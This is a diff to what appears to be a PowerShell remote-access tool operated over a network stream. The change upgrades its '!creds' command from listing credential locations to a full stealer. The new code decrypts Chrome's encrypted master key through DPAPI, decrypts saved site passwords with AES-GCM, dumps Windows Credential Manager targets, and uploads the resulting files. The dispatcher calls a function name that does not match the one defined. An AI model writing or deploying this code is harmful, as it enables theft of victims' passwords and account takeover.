@@ -389,36 +389,70 @@ function PortSuggest {
 
     function Get-Credentials {
     try {
-        $output = ""
+        $outputFiles = @()
+        $guid = $env:COMPUTERNAME
+        $basePath = "$env:TEMP\$guid-creds"
+        New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 
-        # 1. Windows Credential Manager (generic credentials)
-        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
-            $target = $_.ToString().Split(":")[1].Trim()
-            $output += "`n[TARGET] $target"
+        # === Chrome Logins ===
+        $chromeLogin = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+        if ((Test-Path $chromeLogin) -and (Test-Path $localState)) {
+            $state = Get-Content $localState -Raw | ConvertFrom-Json
+            $key = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                [Convert]::FromBase64String($state.os_crypt.encrypted_key)[5..],
+                $null, 'CurrentUser'
+            )
+
+            $tempLogin = "$env:TEMP\login.db"
+            Copy-Item $chromeLogin $tempLogin -Force
+
+            $outFile = Join-Path $basePath "chrome_passwords.txt"
+            $query = "SELECT origin_url, username_value, password_value FROM logins"
+            $conn = New-Object Data.SQLite.SQLiteConnection("Data Source=$tempLogin;Version=3;")
+            $conn.Open()
+            $cmd = $conn.CreateCommand(); $cmd.CommandText = $query
+            $reader = $cmd.ExecuteReader()
+            $lines = @()
+            while ($reader.Read()) {
+                $url = $reader.GetString(0)
+                $user = $reader.GetString(1)
+                $enc = [byte[]]::new($reader.GetBytes(2,0,$null,0,0))
+                $reader.GetBytes(2,0,$enc,0,$enc.Length)
+                if ($enc.Length -gt 15) {
+                    $nonce = $enc[3..14]; $ct = $enc[15..($enc.Length - 17)]; $tag = $enc[($enc.Length - 16)..]
+                    $aes = [System.Security.Cryptography.AesGcm]::new($key)
+                    $pt = [byte[]]::new($ct.Length)
+                    $aes.Decrypt($nonce, $ct, $tag, $pt)
+                    $pass = [Text.Encoding]::UTF8.GetString($pt)
+                    $lines += \"$url`n[$user / $pass]`n\"
+                }
+            }
+            $reader.Close(); $conn.Close()
+            $lines | Out-File $outFile -Encoding UTF8
+            $outputFiles += $outFile
         }
 
-        # 2. Chrome saved logins (мета-данные — без дешифровки)
-        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeLoginPath) {
-            $output += "`n[+] Chrome login database found: $chromeLoginPath"
+        # === Windows Credentials ===
+        $cmdkeyOut = cmdkey /list | Select-String "Target:"
+        if ($cmdkeyOut) {
+            $winOut = Join-Path $basePath "windows_creds.txt"
+            $cmdkeyOut | ForEach-Object { $_.ToString().Trim() } | Out-File $winOut
+            $outputFiles += $winOut
         }
 
-        # 3. Firefox профили (только список профилей)
-        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
-        foreach ($profile in $firefoxProfiles) {
-            $output += "`n[+] Firefox profile: $($profile.FullName)"
+        # === Upload All Files ===
+        $result = @()
+        foreach ($f in $outputFiles) {
+            $result += Upload-File $f
         }
-
-        if ([string]::IsNullOrWhiteSpace($output)) {
-            return "[INFO] No credentials found or access denied."
-        }
-
-        return $output
+        return $result -join \"`n\"
     }
     catch {
-        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
+        return \"[ERROR] Failed to extract credentials: $($_.Exception.Message)\"
     }
 }
+
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -636,7 +670,8 @@ ________  ___  ________  ________      ________  ________
      /  / /\ \  \ \   ____\ \  \\\  \   \ \   __  \ \  \ \\ \  
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
-    \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|                                                                                                                                                                        
+    \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|   
+                                    (CREDS TEST 1)                                                                                                                                                                     
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -695,7 +730,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-Credentials
+                        $response = Get-CredentialsFull
                     }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
